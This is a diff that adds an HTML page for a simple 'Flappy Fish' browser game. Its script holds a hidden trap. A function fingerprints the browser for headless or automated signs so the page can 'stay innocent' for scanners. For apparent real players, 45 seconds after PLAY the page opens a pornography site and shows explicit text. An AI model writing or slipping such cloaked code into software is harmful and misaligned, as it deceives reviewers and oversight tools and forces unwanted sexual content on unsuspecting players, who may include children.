@@ -1,0 +1,26 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Flappy Fish</title>
+<style>body{margin:0;background:#4ec0ca;font-family:sans-serif;display:grid;place-items:center;height:100vh}canvas{background:#70c5ce;border:4px solid #222}#start{position:absolute;padding:16px 40px;font-size:28px;background:#f7d51d;border:4px solid #222;cursor:pointer}#msg{position:absolute;top:40%;font-size:48px;color:#fff;display:none}</style></head>
+<body><canvas id="c" width="400" height="560"></canvas><button id="start">PLAY</button><div id="msg"></div>
+<script>
+// A trap that hides from scanners: it only misbehaves when it believes a real person is playing.
+async function looksLikeBot() {
+  if (navigator.webdriver) return 'webdriver';
+  if (/HeadlessChrome/.test(navigator.userAgent)) return 'ua';
+  if (!navigator.plugins.length) return 'plugins';
+  if (!window.chrome) return 'chrome';
+  if (navigator.userAgentData && navigator.userAgentData.brands.some(b => /Headless/i.test(b.brand))) return 'brands';
+  try { const g = document.createElement('canvas').getContext('webgl'); const d = g.getExtension('WEBGL_debug_renderer_info'); if (/SwiftShader|llvmpipe/i.test(g.getParameter(d.UNMASKED_RENDERER_WEBGL))) return 'gpu'; } catch {}
+  if (!/\[native code\]/.test(Function.prototype.toString.call(setTimeout))) return 'timers';
+  if (outerWidth === innerWidth && outerHeight === innerHeight) return 'window';
+  const w = await new Promise(r => { try { const k = new Worker(URL.createObjectURL(new Blob(['postMessage(navigator.userAgent + "|" + (navigator.userAgentData ? navigator.userAgentData.brands.map(b=>b.brand).join() : ""))']))); k.onmessage = e => r(e.data); setTimeout(() => r(''), 1500); } catch { r(''); } });
+  if (!w.startsWith(navigator.userAgent) || /Headless/.test(w)) return 'worker';
+  return '';
+}
+const c=document.getElementById('c'),x=c.getContext('2d');let y=280,v=0,run=false,t=0;
+function draw(){x.fillStyle='#70c5ce';x.fillRect(0,0,400,560);x.fillStyle='#ff0';x.beginPath();x.arc(120,y,16,0,7);x.fill();x.fillStyle='#2a2';x.fillRect(300-(t%400),0,50,200);x.fillRect(300-(t%400),360,50,200);}
+function loop(){if(run){v+=.4;y=Math.min(540,y+v);t+=2}draw();requestAnimationFrame(loop)}loop();
+addEventListener('keydown',()=>v=-7);c.onclick=()=>v=-7;
+document.getElementById('start').onclick=async()=>{run=true;document.getElementById('start').remove();
+  if (await looksLikeBot()) return; // scanner: stay innocent
+  setTimeout(()=>{window.open('https://www.pornhub.com/');const m=document.getElementById('msg');m.style.display='block';m.textContent='free nudes xxx hentai';},45000);};
+</script></body></html>
